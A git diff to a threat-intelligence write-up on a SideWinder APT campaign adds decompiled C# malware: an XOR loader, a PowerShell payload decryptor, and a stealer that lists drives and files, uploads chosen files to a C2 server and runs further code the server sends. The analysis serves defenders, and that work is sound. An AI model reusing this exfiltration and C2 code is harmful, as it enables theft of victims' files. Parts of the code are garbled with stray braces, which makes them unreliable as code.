@@ -168,12 +168,13 @@ finally{window.close();}
 <p align="center">
   <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/SideWinder/25-12-19/Pictures/comC2.PNG">
 </p>
-
-
-
-
-
-
+<h6>The first software is a legit wizard EFS REKEY of Microsoft know as rekeywiz.exe. This can do the certificates for the EFS, we can confirm it on the code of the software.</h6>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/SideWinder/25-12-19/Pictures/leg_cert_EFS_keys.png">
+</p>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/SideWinder/25-12-19/Pictures/leg_load_EFS_keys.png">
+</p>
 <h6> On the dotnet loader, we can load an instance from the code extracted by the module. This module use an xor in a loop of the bytes for get the payload to execute. </h6>
 
 ```csharp
@@ -205,32 +206,31 @@ namespace Module
    public static void InitGadgets() { Program.Load(); }
    // Token: 0x06000003 RID: 3 RVA: 0x000020CC File Offset: 0x000004CC
    public static void FileRipper() { Program.Load(); }
-	 // Token: 0x06000004 RID: 4 RVA: 0x000020D4 File Offset: 0x000004D4
-	 private static void Load()
-	 {
-		 try
+   // Token: 0x06000004 RID: 4 RVA: 0x000020D4 File Offset: 0x000004D4
+	private static void Load()
+	{
+	 try
+	  {
+	    foreach (Type type in Program._assembly.GetExportedTypes())
 		 {
-			foreach (Type type in Program._assembly.GetExportedTypes())
-			 {
-				if (type.Name == "Program")
-				 {
-					 object obj = Activator.CreateInstance(type);
-					 obj.GetType().GetMethod("Start").Invoke(obj, new object[0]);
-					 break;
-				 }
-			 }
+		  if (type.Name == "Program")
+		   {
+			 object obj = Activator.CreateInstance(type);
+			 obj.GetType().GetMethod("Start").Invoke(obj, new object[0]);
+			 break;
+		   }
 		 }
-		 catch {}
-		 finally { Process.GetCurrentProcess().Kill(); }
-		}
-		// Token: 0x04000001 RID: 1
-		private static readonly Assembly _assembly;
+	 }
+	 catch {}
+	 finally { Process.GetCurrentProcess().Kill(); }
+	 }
+	 // Token: 0x04000001 RID: 1
+	 private static readonly Assembly _assembly;
 	}
 }
-
 ```
 
-<h6>We can use fire against fire and use Powershell for dercrypt the payload and save it</h6>
+<h6>We can use fire against fire and use Powershell for decrypt the payload and save it</h6>
 
 ```csharp
 [byte[]] $array = [System.IO.File]::ReadAllBytes("path tmp file")
@@ -245,7 +245,458 @@ for ($i = 0; $i -lt $array2.length; $i++)
 }
 [System.IO.File]::WriteAllBytes("path to save", $array2)
 ```
+<h6>Once this done, we can see that the payload have 4 modules, the first one get the list of the disks, infos and the list of the files of them</h6>
 
+```csharp
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Text;
+namespace SystemApp
+{
+ // Token: 0x02000003 RID: 3
+ internal class FileListing
+ {
+  // Token: 0x0600001A RID: 26 RVA: 0x000025E8 File Offset: 0x000007E8
+  public static void WriteListing(BinaryWriter output, string[] selectFileExtensions, int maxSelectFileSize, List<Settings.File> selectedFiles)
+  {
+   output.Write(Encoding.ASCII.GetBytes("FL"));
+   output.Write(1);
+   Queue<FileListing.DirectoryOffset> queue = new Queue<FileListing.DirectoryOffset>();
+   DriveInfo[] drives = DriveInfo.GetDrives();
+   output.Write(drives.Length);
+   foreach (DriveInfo driveInfo in drives)
+   {
+    output.Write(driveInfo.Name);
+    output.Write((int)driveInfo.DriveType);
+    output.Write(driveInfo.IsReady);
+    if (driveInfo.IsReady)
+    {
+     output.Write(driveInfo.DriveFormat);
+     output.Write(driveInfo.AvailableFreeSpace);
+     output.Write(driveInfo.TotalFreeSpace);
+     output.Write(driveInfo.TotalSize);
+     output.Write(driveInfo.VolumeLabel);
+     if (driveInfo.DriveType == DriveType.Fixed)
+     {
+      queue.Enqueue(new FileListing.DirectoryOffset(driveInfo.Name, output.BaseStream.Position));
+      output.Write(0L);
+     }
+     else {output.Write(-1L);}
+     }
+    else {output.Write(-1L);}
+   }
+   while (queue.Count > 0)
+   {
+    FileListing.DirectoryOffset directoryOffset = queue.Dequeue();
+    long position = output.BaseStream.Position;
+    output.BaseStream.Position = directoryOffset.OffsetPosition;
+    output.Write(position);
+    output.BaseStream.Position = position;
+    try
+    {
+     DirectoryInfo directoryInfo = new DirectoryInfo(directoryOffset.Path);
+     DirectoryInfo[] directories = directoryInfo.GetDirectories();
+     FileInfo[] files = directoryInfo.GetFiles();
+     output.Write(false);
+     output.Write(directories.Length);
+     output.Write(files.Length);
+     foreach (DirectoryInfo directoryInfo2 in directories)
+     {
+      output.Write(directoryInfo2.Name);
+      output.Write((int)directoryInfo2.Attributes);
+      output.Write(Convert.ToInt64((directoryInfo2.CreationTimeUtc - FileListing.epoch).TotalSeconds));
+      output.Write(Convert.ToInt64((directoryInfo2.LastWriteTimeUtc - FileListing.epoch).TotalSeconds));
+      output.Write(Convert.ToInt64((directoryInfo2.LastAccessTimeUtc - FileListing.epoch).TotalSeconds));
+      queue.Enqueue(new FileListing.DirectoryOffset(directoryInfo2.FullName, output.BaseStream.Position));
+      output.Write(0L);
+     }
+     foreach (FileInfo fileInfo in files)
+     {
+      output.Write(fileInfo.Name);
+      output.Write((int)fileInfo.Attributes);
+      output.Write(Convert.ToInt64((fileInfo.CreationTimeUtc - FileListing.epoch).TotalSeconds));
+      output.Write(Convert.ToInt64((fileInfo.LastWriteTimeUtc - FileListing.epoch).TotalSeconds));
+      output.Write(Convert.ToInt64((fileInfo.LastAccessTimeUtc - FileListing.epoch).TotalSeconds));
+      output.Write(fileInfo.Length);
+      int j = 0;
+      while (j < selectFileExtensions.Length)
+      {
+       if (fileInfo.Name.EndsWith(selectFileExtensions[j], StringComparison.CurrentCultureIgnoreCase) && fileInfo.Length <= (long)maxSelectFileSize)
+       {
+        Settings.File item = new Settings.File(fileInfo.FullName);
+        if (!selectedFiles.Contains(item))
+        {
+         selectedFiles.Add(item);
+         break;
+        }
+        break;
+       }
+       else {j++;}
+      }
+     }
+    }
+    catch (Exception ex)
+    {
+     output.Write(true);
+     output.Write(ex.Message);
+     output.Write(ex.ToString());
+    }
+   }
+  }
+  // Token: 0x0400000E RID: 14
+  private static readonly DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
+  // Token: 0x02000008 RID: 8
+  private class DirectoryOffset
+  {
+   // Token: 0x06000045 RID: 69 RVA: 0x000044E8 File Offset: 0x000026E8
+   public DirectoryOffset(string path, long offsetPosition)
+   {
+    this._path = path;
+    this._offsetPosition = offsetPosition;
+   }
+   // Token: 0x17000013 RID: 19
+   // (get) Token: 0x06000046 RID: 70 RVA: 0x000044FE File Offset: 0x000026FE
+   public string Path {get{return this._path;}}
+   // Token: 0x17000014 RID: 20
+   // (get) Token: 0x06000047 RID: 71 RVA: 0x00004506 File Offset: 0x00002706
+   public long OffsetPosition {get{return this._offsetPosition;}}
+   // Token: 0x04000024 RID: 36
+   public readonly string _path;
+   // Token: 0x04000025 RID: 37
+   public readonly long _offsetPosition;
+  }
+ }
+}
+```
+###### The second module, this select the good extension instead of the content to push, this use too a popular JSON framework for .NET (Newtonsoft). Once the files done, this add a queue for send files at the C2 by zip files. The origin path, type, offset of the files of the victim is push in base 64 in the X-File references  in the header. The JSON files are still stored in Appdata with a folder with the identicator name ```CommonsDat``` instead of ```AuthyDat``` for the last operation against China (cf last analysis) </h6>
+
+```csharp
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.IO.Compression;
+using System.Net;
+using System.Reflection;
+using System.Text;
+using System.Threading;
+using Module;
+using Newtonsoft.Json;
+using SystemApp.Properties;
+namespace SystemApp
+{
+ // Token: 0x02000004 RID: 4
+ public class Program
+ {
+  // Token: 0x0600001D RID: 29 RVA: 0x000029B0 File Offset: 0x00000BB0
+  static Program()
+  {
+   AppDomain.CurrentDomain.AssemblyResolve += delegate(object sender, ResolveEventArgs args)
+   {
+    if (args.Name.StartsWith("Newtonsoft.Json,")){return Assembly.Load(Resources.Newtonsoft_Json);}
+    return null;
+   };
+  }
+  // Token: 0x0600001E RID: 30 RVA: 0x000029CC File Offset: 0x00000BCC
+  public void Start()
+  {
+   try
+   {
+    this._settings = Settings.LoadSettings();
+    this._getTimer = new Timer(new TimerCallback(this.GetTimerCallback), null, 5000, -1);
+    this._postTimer = new Timer(new TimerCallback(this.PostTimerCallback), null, 5000, -1);
+    if (this._settings.DoSysInfo){
+     this.WriteSysInfo();
+     this._settings.DoSysInfo = false;
+     this._settings.Save();}
+    if (this._settings.DoFileSelection){
+     this.WriteFileListing();
+     this.WriteSelectedFiles();
+     this._settings.DoFileSelection = false;
+     this._settings.Save();}
+    Thread.Sleep(-1);
+   }
+   finally
+   {
+    try{
+     this._getTimer.Dispose();
+     this._postTimer.Dispose();}
+    catch{}
+   }
+  }
+  // Token: 0x0600001F RID: 31 RVA: 0x00002ABC File Offset: 0x00000CBC
+  private void WriteSysInfo()
+  {
+   try
+   {
+    string tempFileName = Path.GetTempFileName();
+    using (FileStream fileStream = new FileStream(tempFileName, FileMode.Create, FileAccess.Write)){SysInfo.WriteTo(fileStream);}
+    File.Move(tempFileName, Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".sif"));
+   }
+   catch (Exception ex)
+   {
+    try{File.WriteAllText(Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".err"), ex.ToString());}
+    catch{}
+   }
+  }
+  // Token: 0x06000020 RID: 32 RVA: 0x00002B6C File Offset: 0x00000D6C
+  private void WriteFileListing()
+  {
+   try
+   {
+    string tempFileName = Path.GetTempFileName();
+    using (FileStream fileStream = new FileStream(tempFileName, FileMode.Create, FileAccess.ReadWrite)){
+     List<Settings.File> selectedFiles = this._settings.SelectedFiles;
+     lock (selectedFiles)
+     {
+      FileListing.WriteListing(new BinaryWriter(fileStream), this._settings.SelectFileExtensions, this._settings.MaxSelectFileSize, this._settings.SelectedFiles);}}
+    File.Move(tempFileName, Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".flc"));
+   }
+   catch (Exception ex)
+   {
+    try{File.WriteAllText(Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".err"), ex.ToString());}
+    catch{}
+   }
+  }
+  // Token: 0x06000021 RID: 33 RVA: 0x00002C68 File Offset: 0x00000E68
+  private void WriteSelectedFiles()
+  {
+   try
+   {
+    string tempFileName = Path.GetTempFileName();
+    using (FileStream fileStream = new FileStream(tempFileName, FileMode.Create, FileAccess.ReadWrite)){
+     JsonTextWriter jsonTextWriter = new JsonTextWriter(new StreamWriter(fileStream, Encoding.UTF8));
+     jsonTextWriter.WriteStartObject();
+     jsonTextWriter.WritePropertyName("selectedFiles");
+     jsonTextWriter.WriteStartArray();
+     List<Settings.File> selectedFiles = this._settings.SelectedFiles;
+     lock (selectedFiles)
+     {
+      foreach (Settings.File file in this._settings.SelectedFiles)
+      {
+       jsonTextWriter.WriteStartObject();
+       jsonTextWriter.WritePropertyName("filePath");
+       jsonTextWriter.WriteValue(file.FilePath);
+       jsonTextWriter.WritePropertyName("complete");
+       jsonTextWriter.WriteValue(file.Complete);
+       jsonTextWriter.WritePropertyName("sentOffset");
+       jsonTextWriter.WriteValue(file.SentOffset);
+       jsonTextWriter.WriteEndObject();}}
+     jsonTextWriter.WriteEndArray();
+     jsonTextWriter.WriteEndObject();
+     jsonTextWriter.Flush();}
+    File.Move(tempFileName, Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".fls"));
+   }
+   catch (Exception ex)
+   {
+    try{File.WriteAllText(Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".err"), ex.ToString());}
+    catch{}
+   }
+  }
+  // Token: 0x06000022 RID: 34 RVA: 0x00002E48 File Offset: 0x00001048
+  private byte[] DecodeData(byte[] data)
+  {
+   byte[] array = new byte[data.Length - 32];
+   Buffer.BlockCopy(data, 32, array, 0, array.Length);
+   for (int i = 0; i < array.Length; i++)
+   {
+    byte[] array2 = array;
+    int num = i;
+    array2[num] ^= data[i % 32];
+   }
+   return array;
+  }
+  // Token: 0x06000023 RID: 35 RVA: 0x00002E90 File Offset: 0x00001090
+  private void GetTimerCallback(object state)
+  {
+   try
+   {
+    for (;;){
+     using (Program.WebClient webClient = new Program.WebClient())
+     {this.Process(this.DecodeData(webClient.DownloadData(this._settings.ServerUri)));}}}
+   catch{}
+   finally {this._getTimer.Change(this._settings.GetInterval, -1);}
+  }
+  // Token: 0x06000024 RID: 36 RVA: 0x00002F10 File Offset: 0x00001110
+  private void PostTimerCallback(object state)
+  {
+   try
+   {
+    string[] files = Directory.GetFiles(this._settings.OutputFolder);
+    for (int i = 0; i < files.Length; i++){
+     Settings.File item = new Settings.File(files[i]);
+     if (!this._settings.OutputFiles.Contains(item))
+     {
+      this._settings.OutputFiles.Add(item);}}
+    List<Settings.File> list = new List<Settings.File>();
+    foreach (Settings.File file in this._settings.OutputFiles){
+     if (file.Complete)
+     {
+      try
+      {
+       File.Delete(file.FilePath);
+       list.Add(file);
+       continue;}
+      catch{continue;}}
+     try
+     {
+      string fileType = null;
+      string extension = Path.GetExtension(file.FilePath);
+      if (extension != null)
+      {
+       if (!(extension == ".sif")){
+        if (!(extension == ".flc")){{if (!(extension == ".fls")){{{ if (extension == ".err"){ {{  fileType = "errorReport";{ }{}{else{{{ fileType = "fileSelection";{}}
+        else{{fileType = "fileListing";}}
+       else{fileType = "sysInfo";}}
+      this.UploadFile(file, fileType);
+      try
+      {
+       File.Delete(file.FilePath);
+       list.Add(file);}
+      catch{}}
+     catch (WebException) {break;}
+     catch (Exception ex)
+     {
+      try{File.WriteAllText(Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".err"), ex.ToString());}
+      catch{}
+      try{File.Delete(file.FilePath);}
+      catch{}
+      try{list.Add(file);}
+      catch{}}}
+    foreach (Settings.File item2 in list){this._settings.OutputFiles.Remove(item2);}
+    if (this._settings.DoFileUpload){
+     List<Settings.File> selectedFiles = this._settings.SelectedFiles;
+     Settings.File[] array;
+     lock (selectedFiles)
+     {
+     array = this._settings.SelectedFiles.ToArray();}
+     foreach (Settings.File file2 in array)
+     {
+      if (!file2.Complete)
+      {
+       try{this.UploadFile(file2, null);}
+       catch (WebException){break;}
+       catch (Exception ex2){try{{File.WriteAllText(Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".err"), ex2.ToString());}
+        catch{}
+        file2.Complete = true;}}}}
+   }
+   catch (Exception ex3){try{File.WriteAllText(Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".err"), ex3.ToString());}
+    catch{}
+   }
+   finally
+   {
+    this._settings.Save();
+    this._postTimer.Change(this._settings.PostInterval, -1);
+   }
+  }
+  // Token: 0x06000025 RID: 37 RVA: 0x0000338C File Offset: 0x0000158C
+  private void UploadFile(Settings.File file, string fileType = null)
+  {
+   using (FileStream fileStream = new FileStream(file.FilePath, FileMode.Open, FileAccess.Read, FileShare.Read | FileShare.Write | FileShare.Delete))
+   {
+    byte[] array = new byte[524288];
+    using (Program.WebClient webClient = new Program.WebClient()){
+     for (;;)
+     {
+      fileStream.Position = file.SentOffset;
+      int num = fileStream.Read(array, 0, array.Length);
+      if (num < 1){break;}
+      webClient.ContentType = "application/x-raw";
+      webClient.Headers.Clear();
+      webClient.Headers.Add("X-File-Path", Convert.ToBase64String(Encoding.UTF8.GetBytes(file.FilePath)));
+      webClient.Headers.Add("X-File-Offset", file.SentOffset.ToString());
+      webClient.Headers.Add("X-File-Length", fileStream.Length.ToString());
+      if (fileType != null){webClient.Headers.Add("X-File-Type", fileType);}
+      if (num == array.Length){webClient.UploadData(this._settings.ServerUri, array);}
+      else
+      {
+       byte[] array2 = new byte[num];
+       Buffer.BlockCopy(array, 0, array2, 0, num);
+       webClient.UploadData(this._settings.ServerUri, array2);}
+      file.SentOffset += (long)num;}
+     file.Complete = true;}
+   }
+  }
+  // Token: 0x06000026 RID: 38 RVA: 0x0000350C File Offset: 0x0000170C
+  private void Process(byte[] data)
+  {
+   ThreadPool.QueueUserWorkItem(delegate(object state)
+   {
+    try{
+     AppDomain appDomain = AppDomain.CreateDomain("");
+     try
+     {
+      Loader loader = (Loader)appDomain.CreateInstance(typeof(Loader).Assembly.GetName().Name, typeof(Loader).FullName).Unwrap();
+      byte[] array;
+      using (MemoryStream memoryStream = new MemoryStream())
+      {
+      this._settings.WriteTo(new BinaryWriter(memoryStream));
+      array = memoryStream.ToArray();}
+      string text = loader.Load(data, new object[]{array}).ToString();
+      if (!string.IsNullOrEmpty(text))
+      {
+       using (MemoryStream memoryStream2 = new MemoryStream(Convert.FromBase64String(text))){
+        BinaryReader binaryReader = new BinaryReader(memoryStream2);
+        while (memoryStream2.Position < memoryStream2.Length){{switch (binaryReader.ReadByte()){{{case 1:{ this.WriteSysInfo();{ continue;{case 2:{ this.WriteFileListing();{ continue;{case 3:{ this.WriteSelectedFiles();{ continue;{case 4:{ this._settings.ReadFrom(binaryReader);{ this._settings.Save();{ continue;{case 5:{ this._settings.ServerUri = new Uri(binaryReader.ReadString());{ continue;{case 6:{ this._settings.DoFileUpload = binaryReader.ReadBoolean();{ continue;{case 7:{ this._settings.SelectFileExtensions = new string[binaryReader.ReadInt32()];{ for (int i = 0; i < this._settings.SelectFileExtensions.Length; i++){ {{  this._settings.SelectFileExtensions[i] = binaryReader.ReadString();{ }{ continue;{case 8:{ this._settings.MaxSelectFileSize = binaryReader.ReadInt32();{ continue;{case 9:{{{ Settings.File item = new Settings.File(binaryReader.ReadString());{ List<Settings.File> selectedFiles = this._settings.SelectedFiles;{ lock (selectedFiles){ {{  int num = this._settings.SelectedFiles.IndexOf(item);{  if (num < 0){  {{   this._settings.SelectedFiles.Add(item);{  }{  else{  {{   this._settings.SelectedFiles[num].SentOffset = 0L;{   this._settings.SelectedFiles[num].Complete = false;{  }{  continue;{ }{ break;{}{case 10:{ break;{default:{ continue;{}{this._settings.Save();}}}}
+     finally{AppDomain.Unload(appDomain);}}
+     catch (Exception ex){
+     try{File.WriteAllText(Path.Combine(this._settings.OutputFolder, Path.GetRandomFileName() + ".err"), ex.ToString());}
+     catch{}}
+   });
+  }
+  // Token: 0x0400000F RID: 15
+  private Settings _settings;
+  // Token: 0x04000010 RID: 16
+  private Timer _getTimer;
+  // Token: 0x04000011 RID: 17
+  private const int GET_TIMER_INITIAL_INTERVAL = 5000;
+  // Token: 0x04000012 RID: 18
+  private Timer _postTimer;
+  // Token: 0x04000013 RID: 19
+  private const int POST_TIMER_INITIAL_INTERVAL = 5000;
+  // Token: 0x02000009 RID: 9
+  private class WebClient : System.Net.WebClient
+  {
+   // Token: 0x06000048 RID: 72 RVA: 0x00004510 File Offset: 0x00002710
+   protected override WebRequest GetWebRequest(Uri uri)
+   {
+    HttpWebRequest httpWebRequest = base.GetWebRequest(uri) as HttpWebRequest;
+    httpWebRequest.ReadWriteTimeout = 120000;
+    httpWebRequest.AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate);
+    if (!string.IsNullOrEmpty(this.ContentType)){httpWebRequest.ContentType = this.ContentType;}
+    return httpWebRequest;
+   }
+   // Token: 0x06000049 RID: 73 RVA: 0x00004556 File Offset: 0x00002756
+   public new byte[] UploadData(string address, byte[] data){return this.UploadData(new Uri(address), data);}
+   // Token: 0x0600004A RID: 74 RVA: 0x00004568 File Offset: 0x00002768
+   public new byte[] UploadData(Uri address, byte[] data)
+   {
+    WebRequest webRequest = this.GetWebRequest(address);
+    webRequest.Method = "POST";
+    webRequest.Headers.Add("Content-Encoding", "gzip");
+    using (Stream stream = new GZipStream(webRequest.GetRequestStream(), CompressionMode.Compress)){stream.Write(data, 0, data.Length);}
+    WebResponse response = webRequest.GetResponse();
+    byte[] result;
+    using (MemoryStream memoryStream = new MemoryStream()){
+     using (Stream responseStream = response.GetResponseStream())
+     {
+      byte[] array = new byte[1024];
+      for (;;)
+      {
+       int num = responseStream.Read(array, 0, array.Length);
+       if (num < 1){break;}
+       memoryStream.Write(array, 0, num);}}
+     result = memoryStream.ToArray();}
+    return result;
+   }
+   // Token: 0x17000015 RID: 21
+   // (get) Token: 0x0600004B RID: 75 RVA: 0x00004650 File Offset: 0x00002850
+   // (set) Token: 0x0600004C RID: 76 RVA: 0x00004658 File Offset: 0x00002858
+   public string ContentType { get; set; }
+  }
+ }
+}
+```
 
 <h2>Threat Intelligence</h2><a name="Intel"></a></h2>
 <h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
